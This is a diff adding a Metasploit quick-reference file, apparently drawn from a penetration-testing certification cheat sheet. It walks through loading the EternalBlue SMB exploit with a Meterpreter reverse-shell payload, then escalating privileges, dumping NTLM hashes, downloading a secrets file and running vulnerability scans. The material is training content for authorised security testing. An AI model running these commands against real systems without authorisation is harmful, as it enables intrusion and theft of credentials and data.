@@ -1,0 +1,49 @@
+# Metasploit — Quick Reference
+# Source: CPENT cheat sheet (Metasploit)
+
+## Launch
+msfconsole
+msfconsole -q                         # quiet mode
+
+## Search & use
+search type:exploit platform:windows smb
+search cve:2017-0144
+use exploit/windows/smb/ms17_010_eternalblue
+info                                  # show module info
+
+## Options
+show options
+set RHOSTS 192.168.1.100
+set LHOST 192.168.1.10
+set LPORT 4444
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+run  (or exploit)
+
+## Sessions
+sessions -l                           # list sessions
+sessions -i 1                         # interact with session 1
+sessions -u 1                         # upgrade to meterpreter
+background                            # background current session
+
+## Meterpreter
+sysinfo
+getuid
+getsystem                             # attempt privilege escalation
+hashdump                              # dump NTLM hashes
+upload /path/file C:\\Windows\\Temp\\file
+download C:\\secrets.txt /tmp/
+shell                                 # drop to system shell
+migrate <PID>                         # migrate to another process
+run post/windows/gather/enum_applications
+
+## Auxiliary modules
+use auxiliary/scanner/smb/smb_ms17_010
+use auxiliary/scanner/portscan/tcp
+use auxiliary/scanner/http/dir_scanner
+use auxiliary/scanner/ssl/openssl_heartbleed
+
+## Database
+db_nmap -A 192.168.1.0/24
+hosts                                 # view discovered hosts
+services                              # view discovered services
+vulns                                 # view found vulnerabilities
